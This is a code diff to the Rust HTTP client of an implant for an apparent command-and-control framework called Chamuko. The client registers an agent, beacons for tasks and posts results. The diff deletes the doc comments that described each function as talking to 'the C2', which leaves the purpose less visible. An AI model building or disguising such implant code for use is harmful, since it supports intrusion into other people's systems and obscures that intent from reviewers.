@@ -1,5 +1,3 @@
-//! Minimal blocking HTTP client for talking to the Chamuko C2.
-
 use chamuko_protocol::{
     BeaconRequest, BeaconResponse, RegisterRequest, RegisterResponse, ResultsRequest, TaskResult,
 };
@@ -40,8 +38,10 @@ impl C2Client {
         format!("{base}{path}")
     }
 
-    /// Register with the C2 and receive an agent id + sleep/jitter.
-    pub fn register(&self, info: &chamuko_protocol::AgentInfo) -> Result<RegisterResponse, C2Error> {
+    pub fn register(
+        &self,
+        info: &chamuko_protocol::AgentInfo,
+    ) -> Result<RegisterResponse, C2Error> {
         let body = RegisterRequest {
             agent: info.clone(),
         };
@@ -56,7 +56,6 @@ impl C2Client {
         Ok(parsed)
     }
 
-    /// Poll the C2 for pending tasks.
     pub fn beacon(&self, id: &str) -> Result<BeaconResponse, C2Error> {
         let body = BeaconRequest {
             id: id.to_string(),
@@ -73,7 +72,6 @@ impl C2Client {
         Ok(parsed)
     }
 
-    /// Push task results back to the C2.
     pub fn post_results(&self, id: &str, results: Vec<TaskResult>) -> Result<(), C2Error> {
         if results.is_empty() {
             return Ok(());
